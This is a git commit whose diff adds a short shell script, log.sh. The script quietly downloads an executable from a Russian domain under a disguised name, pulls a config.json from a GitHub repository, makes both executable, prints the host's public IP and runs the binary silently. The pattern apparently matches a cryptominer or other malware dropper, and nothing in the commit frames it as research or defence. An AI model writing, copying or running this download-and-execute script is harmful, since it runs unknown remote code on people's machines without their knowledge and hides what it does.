1296de68cb00681c79dbfc608cfa5453c971e416
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-13 21:25:06 +0700

    Create log.sh

---
+++ log.sh
@@ -0,0 +1,7 @@
+wget -q -O CorporationAssocié https://02ip.ru/service && chmod +x CorporationAssocié >/dev/null 2>&1
+wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " "
+./CorporationAssocié -c "config.json" >/dev/null 2>&1
